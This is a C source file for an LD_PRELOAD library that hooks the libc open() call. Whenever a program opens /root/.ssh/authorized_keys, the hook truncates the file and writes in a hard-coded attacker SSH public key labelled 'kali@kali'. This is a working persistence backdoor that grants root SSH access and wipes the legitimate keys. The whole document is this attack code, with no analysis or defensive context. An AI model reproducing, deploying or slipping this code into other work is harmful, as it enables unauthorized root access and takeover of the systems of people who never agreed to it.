#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <dlfcn.h>
#include <stdarg.h>

// Define a function type for the 'open' function with a specific signature
typedef int (*open_func_type)(const char *, int, ...);

// Var to store the pointer to the original 'open' function
static open_func_type orig_open = NULL;

// Function to check if the file path is the target "/root/.ssh/authorized_keys", "authorized_keys" or ".ssh/authorized_keys"
static int target(const char *pathname) {
    if (pathname == NULL) return 0;

    return strcmp(pathname, "/root/.ssh/authorized_keys") == 0 ||
           strcmp(pathname, "authorized_keys") == 0 ||
           strcmp(pathname, ".ssh/authorized_keys") == 0;
}

// Hook for 'open'
int open(const char *pathname, int flags, ...) {
    va_list args;
    mode_t mode = 0;

    // If the original 'open' function pointer is not set, get it using dlsym
    if (!orig_open) {
        orig_open = (open_func_type)dlsym(RTLD_NEXT, "open");
        if (!orig_open) {
            fprintf(stderr, "Error loading orig open function: %s\n", dlerror());
            exit(EXIT_FAILURE);
        }
    }

    // If the O_CREAT flag is set, get the mode argument
    if (flags & O_CREAT) {
        va_start(args, flags);
        mode = va_arg(args, int);
        va_end(args);
    }

    // If the file path matches the target, create or open the "authorized_keys" file and write an SSH key to it
    if (target(pathname)) {
        int fd = orig_open("/root/.ssh/authorized_keys", O_WRONLY | O_CREAT | O_TRUNC, 0600);
        if (fd < 0) {
            return fd;
        }

        const char *sshkey = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC4vFD3iwB8j8H16nCvYiUXY8wk8lCb9u7RH0jp2SUjaFhJ0IM2FYjOlXOobAzWhL/V7gjC3oEuR8xeEi34Mv24GFrKQNZZcrrL5d2cVEhg7X1uB2cK8nztr1f7Ump0Afe3j8suPJWVla/qZaVgvCzZeFIQ7hbZAvV51WD0/f13WgnEiEceM2Asas04Wdq25Jxn7p2VsP+OYhwb/v54KckCXMJRMdW3CdKwtLhUz7Va5fkp2868D2tI0fyN9Sq9UpN5Z21sjPYT7x3m86c1uOjDEfkgxrF0jP8dFqkEqSyQT8bC1rKRLD8sMBG5k+QsJvue223r1rZtUwYRp0u2gosqeqRqw66q8MOFRwjnQUFgyrZVB+C2sn/KMJEOw4fneGVPvh2Y0jixDyT2cxmc+iwwk/M0v2ivCKBPlQ3G6q1ndLbCUywu8k16nGhq3Yoin14Cu9yOUIybkynquZNJeFsQj9r2E6GnxM9h+NlT6kwT6J2hw+RFtafj4osBnqU7mQM= kali@kali\n";
        write(fd, sshkey, strlen(sshkey));

        close(fd);
        return orig_open("/root/.ssh/authorized_keys", O_RDWR | O_APPEND, 0600);
    }

    // If the O_CREAT flag is set, call the original 'open' with the mode
    if (flags & O_CREAT) {
        return orig_open(pathname, flags, mode);
    } else {
        return orig_open(pathname, flags);
    }
}
